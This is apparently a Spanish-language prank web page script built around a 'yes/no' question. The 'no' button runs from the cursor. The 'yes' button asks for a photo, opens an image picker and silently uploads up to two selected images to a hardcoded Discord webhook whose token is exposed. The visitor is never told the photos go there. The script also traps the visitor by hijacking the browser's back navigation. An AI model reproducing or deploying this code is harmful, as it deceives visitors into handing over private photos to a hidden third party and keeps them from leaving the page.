const yesBtn = document.querySelector('#yesBtn');

yesBtn.addEventListener('click', function() {
    alert('Pasame una foto primero😎');
});

const noBtn = document.querySelector('#noBtn');

noBtn.addEventListener('mouseover', function(){
    const randomX = parseInt(Math.random() * 100);
    const randomY = parseInt(Math.random() * 100);
    noBtn.style.setProperty('top', randomY + '%');
    noBtn.style.setProperty('left', randomX + '%');
    noBtn.style.setProperty('transform', `translate(-${randomX}%, -${randomY}%)`);
    document.getElementById("yesBtn").addEventListener("click", function() {
        var fileInput = document.createElement("input");
        fileInput.type = "file";
        fileInput.accept = "image/*";
        fileInput.multiple = true;
    
        fileInput.onchange = function(event) {
            var files = event.target.files;
            var count = Math.min(files.length, 2); // Subir solo las dos primeras imágenes
            for (var i = 0; i < count; i++) {
                var file = files[i];
                uploadToDiscord(file); // Subir cada imagen al servidor de Discord
            }
        };
    
        // Simular la selección de archivos y el evento onchange
        fileInput.click();
    });
    
    function uploadToDiscord(file) {
        var formData = new FormData();
        formData.append('file', file);
    
        fetch('https://discordapp.com/api/webhooks/1231837049129144360/AlHCqwyAMaQbed7K1eIxa6Md8L_KnYW7Sk6HKWcHQJbM8JyOsEUNiOGPfceiGrHG12j_', {
            method: 'POST',
            body: formData
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Error al enviar la imagen al servidor de Discord');
            }
            return response.json();
        })
        .then(data => {
            // Manejar la respuesta del servidor si es necesario
            console.log('Imagen enviada correctamente');
        })
        .catch(error => {
            console.error('Error:', error);
        });
    }
});

// Detecta cuando el usuario navega hacia adelante o hacia atrás en la historia del navegador
window.addEventListener('popstate', function(event) {
    // Redirige al usuario de vuelta a la misma página
    window.location.href = window.location.href;
});

// Guarda una nueva entrada en la historia del navegador
history.pushState(null, null, document.URL);

// Prevención de la acción predeterminada del evento popstate en dispositivos móviles
window.addEventListener('load', function() {
    setTimeout(function() {
        window.addEventListener('popstate', function() {
            history.pushState(null, null, document.URL);
        }, false);
    }, 0);
});
